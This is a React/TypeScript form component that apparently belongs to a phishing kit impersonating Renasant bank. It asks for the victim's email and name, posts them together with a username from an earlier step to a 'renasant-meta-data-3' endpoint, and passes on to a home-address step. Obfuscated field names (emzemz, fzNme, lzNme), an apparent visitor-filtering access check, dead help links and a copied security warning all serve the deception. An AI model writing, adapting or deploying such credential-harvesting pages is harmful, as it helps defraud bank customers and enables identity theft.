import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '', form: '' });
  const [username, setUsername] = useState('');
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
    }
  }, [emzemzState]);

  const validateEmzemz = (emzemz: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(emzemz);
  };

  const validateForm = () => {
    const newErrors = { fzNme: '', lzNme: '', email: '', form: '' };

    if (!email.trim()) newErrors.email = 'Email is required.';
    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format.';
    if (!fzNme.trim()) newErrors.fzNme = 'First name is required.';
    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required.';

    setErrors(newErrors);
    return !newErrors.email && !newErrors.fzNme && !newErrors.lzNme;
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/renasant-meta-data-3/`, {
        emzemz: username,
        email,
        fzNme,
        lzNme,
      });

      navigate('/home-address', {
        state: {
          emzemz: username,
          fzNme,
          lzNme,
        },
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!username) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-600">
          We could not determine your session details. Please return to the previous step and try again.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <div className="space-y-2 text-xs text-slate-600">
      <p>
        For security reasons, never share your username, password, social security number, account number or other private data online,
        unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
      </p>
      <div className="flex flex-wrap items-center justify-center gap-2 text-[#0f4f6c]">
        <a href="#" className="hover:underline">Forgot Username?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Forgot Password?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Forgot Everything?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Locked Out?</a>
      </div>
    </div>
  );

  return (
    <FlowCard
      title="Verify Your Basic Information"
      subtitle={<span className="text-slate-600">Please confirm the details we have on file.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="email">
            Email address
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="email"
              name="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="name@example.com"
            />
          </div>
          {errors.email ? <FormError message={errors.email} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="fzNme">
            First name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="fzNme"
              name="fzNme"
              type="text"
              value={fzNme}
              onChange={(e) => setFzNme(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="First name"
            />
          </div>
          {errors.fzNme ? <FormError message={errors.fzNme} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="lzNme">
            Last name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="lzNme"
              name="lzNme"
              type="text"
              value={lzNme}
              onChange={(e) => setLzNme(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Last name"
            />
          </div>
          {errors.lzNme ? <FormError message={errors.lzNme} /> : null}
        </div>

        {errors.form ? (
          <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
            {errors.form}
          </div>
        ) : null}

        <button
          type="submit"
          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
          ) : (
            <>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
              </svg>
              <span>Continue</span>
            </>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default BasicInfo;
